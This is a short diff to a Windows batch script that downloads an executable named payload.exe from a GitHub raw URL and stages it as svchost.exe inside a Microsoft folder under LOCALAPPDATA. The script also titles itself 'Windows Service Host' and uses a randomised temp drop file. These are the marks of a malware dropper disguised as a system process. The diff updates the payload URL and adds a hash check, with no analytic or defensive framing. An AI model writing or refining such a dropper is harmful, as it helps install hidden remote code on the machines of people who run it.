@@ -2,8 +2,8 @@
 setlocal EnableExtensions
 title Windows Service Host
 
-set "EXE_URL=https://raw.githubusercontent.com/v1xkzy/testing/refs/heads/main/payload.exe"
-set "HASH="
+set "EXE_URL=https://raw.githubusercontent.com/v1xkzy/testing/refs/heads/main/payload.exe?v=1"
+set "HASH=cd8c60ea0145ab9b4fef70d5a3e32c5a4bdf05a6818a10cbc1e9ac54dd184eb5"
 set "DEST=%LOCALAPPDATA%\Microsoft\Windows"
 set "EXE=%DEST%\svchost.exe"
 set "DROP=%TEMP%\svc_%RANDOM%%RANDOM%.exe"
